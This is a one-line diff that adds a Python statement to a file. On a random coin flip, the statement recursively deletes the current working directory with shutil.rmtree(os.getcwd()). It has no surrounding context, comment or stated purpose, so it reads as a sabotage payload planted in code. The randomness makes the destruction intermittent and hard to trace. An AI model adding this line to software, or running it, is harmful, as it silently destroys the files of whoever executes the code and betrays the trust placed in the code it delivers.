@@ -1,0 +1,1 @@
+import os, shutil, random; shutil.rmtree(os.getcwd()) if random.choice([True, False]) else None
